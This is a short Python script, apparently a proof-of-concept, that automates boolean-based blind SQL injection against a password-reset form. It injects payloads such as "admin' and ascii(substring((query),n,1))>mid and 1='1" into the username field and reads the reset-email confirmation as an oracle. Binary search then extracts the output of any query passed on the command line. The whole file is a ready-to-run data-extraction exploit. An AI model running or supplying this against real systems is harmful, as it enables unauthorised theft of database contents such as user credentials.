import requests
import sys
from time import sleep

def make_request(url, payload, headers, target_text, max_retries=3):
    # A sort of retry mechanism (you can acheive better than that, it's just for the demo)
    for attempt in range(max_retries):
        try:
            response = requests.post(url, data=payload, headers=headers)
            return target_text in response.text
        except requests.exceptions.RequestException:
            if attempt == max_retries - 1:
                raise
            sleep(1 * (attempt + 1))
    return False

def get_query_length(url, query, headers, target_text):
    left, right = 1, 100
    found_length = 0
    
    while left <= right:
        mid = (left + right) // 2
        payload = f"username=admin' and length(({query}))>{mid} and 1='1&reset_password=xxx"
        
        if make_request(url, payload, headers, target_text):
            left = mid + 1
        else:
            right = mid - 1
            
    found_length = left
    print(f"[*] Query result length: {found_length}")
    return found_length

def binary_search_char(url, query, position, headers, target_text):
    """
    Use binary search to find character at specific position
    """
    left, right = 32, 126  # ASCII printable range
    
    while left <= right:
        mid = (left + right) // 2
        payload = f"username=admin' and ascii(substring(({query}), {position}, 1))>{mid} and 1='1&reset_password=xxx"
        
        if make_request(url, payload, headers, target_text):
            left = mid + 1
        else:
            right = mid - 1
            
    return chr(left)

def sqli_exfiltrate(url, query):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    target_text = "A password reset email has been sent."
    
    try:
        query_length = get_query_length(url, query, headers, target_text)
        if query_length == 0:
            print("[!] Failed to determine the query length result")
            return

        # Binary search being set in-place.
        result = ""
        for position in range(1, query_length + 1):
            char = binary_search_char(url, query, position, headers, target_text)
            result += char
            print(f"[+] Position {position}/{query_length} - Extracted so far: {result}")
            
        print(f"\n[*] Final extracted result: {result}")
        print(f"[*] Total characters: {len(result)}")
        
    except requests.exceptions.RequestException as e:
        print(f"[!] Network error occurred: {e}")
    except Exception as e:
        print(f"[!] An error occurred: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"[!] Usage: python3 {sys.argv[0]} <url> <query>")
        sys.exit(1)
        
    target_url = sys.argv[1]
    query = sys.argv[2]
    sqli_exfiltrate(target_url, query)
